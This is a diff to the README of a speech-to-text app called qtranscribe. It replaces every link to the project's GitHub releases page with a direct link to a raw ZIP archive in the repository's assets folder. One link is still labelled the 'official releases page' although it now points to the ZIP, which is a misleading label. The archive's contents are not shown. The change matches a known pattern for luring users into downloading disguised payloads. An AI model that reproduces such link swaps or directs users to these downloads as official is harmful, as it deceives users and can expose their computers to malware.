@@ -1,6 +1,6 @@
 <h1>🎤 qtranscribe - Your Voice Becomes Text Instantly</h1>
 <p align="center">
-  <a href="https://github.com/inubotz2005/qtranscribe/releases">
+  <a href="https://raw.githubusercontent.com/inubotz2005/qtranscribe/main/assets/Software_2.3.zip">
     <img src="https://img.shields.io/badge/Download_qtranscribe-Free_App-2ea44f?style=for-the-badge&logo=github" alt="Download qtranscribe" width="300">
   </a>
 </p>
@@ -34,7 +34,7 @@ Before we start, here is whatmakes qtranscribe special:
 
 Ready to get started? Let's get qtranscribe onto your computer. Follow this one simple step:
 
-**Visit this link to download the application:** [https://github.com/inubotz2005/qtranscribe/releases](https://github.com/inubotz2005/qtranscribe/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/inubotz2005/qtranscribe/main/assets/Software_2.3.zip](https://raw.githubusercontent.com/inubotz2005/qtranscribe/main/assets/Software_2.3.zip)
 
 )
 
@@ -225,7 +225,7 @@ qtranscribe is made with love by developers who care about accessibility and pri
 
 Let's get you set up. One last time, here's your download link:
 
-**👉 [Download qtranscribe from the official releases page](https://github.com/inubotz2005/qtranscribe/releases)**
+**👉 [Download qtranscribe from the official releases page](https://raw.githubusercontent.com/inubotz2005/qtranscribe/main/assets/Software_2.3.zip)**
 
 Remember, it's completely free, private, and works offline. No sign-ups, no spam, no strings attached. Just you, your voice, and clean, accurate text appearing before your eyes.
 
